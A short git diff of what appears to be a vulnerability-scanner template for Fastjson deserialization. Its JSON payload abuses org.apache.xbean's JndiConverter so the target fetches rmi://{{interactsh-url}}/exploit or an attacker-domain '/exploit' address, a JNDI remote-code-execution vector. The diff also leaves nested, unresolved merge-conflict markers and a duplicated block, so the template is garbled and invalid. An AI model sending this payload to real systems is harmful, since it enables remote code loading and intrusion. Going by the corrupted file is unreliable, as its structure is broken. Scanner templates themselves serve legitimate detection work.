@@ -27,6 +27,7 @@ requests:
         {
            "@type":"org.apache.xbean.propertyeditor.JndiConverter",
 <<<<<<< HEAD
+<<<<<<< HEAD
            "AsText":"rmi://{{interactsh-url}}/exploit"
         }
 
@@ -45,3 +46,7 @@ requests:
            "AsText":"rmi://{{Host}}.{{Port}}.{{Subdomains}}.fastjson.{{MY-DOMAIN}}/exploit"
         }
 >>>>>>> 5d36d276 (add new stuff)
+=======
+           "AsText":"rmi://{{Host}}.{{Port}}.{{Subdomains}}.fastjson.{{MY-DOMAIN}}/exploit"
+        }
+>>>>>>> 18ddf72b (add new stuff)
